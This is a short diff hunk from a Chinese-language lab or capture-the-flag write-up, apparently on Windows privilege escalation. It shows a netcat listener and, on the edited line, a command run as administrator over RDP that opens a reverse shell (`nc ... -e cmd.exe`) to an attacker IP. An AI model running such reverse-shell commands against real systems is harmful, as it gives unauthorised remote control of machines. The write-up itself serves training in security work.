@@ -196,7 +196,7 @@ nc -lvnp 12345
 
 ![image-20221008130201266](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221008130201266.png)
 
-然后使用 RDP 登录到目标的_管理员账户_，并在 cmd 上输入以下内容:`nc 10.10.44.92 12345 -e"cmd.exe"`
+然后使用 RDP 登录到目标&#x7684;_&#x7BA1;理员账户_，并在 cmd 上输入以下内容:`nc 10.10.44.92 12345 -e"cmd.exe"`
 
 ```shell
 #使用攻击机终端 通过RDP登录到目标系统的管理员账户
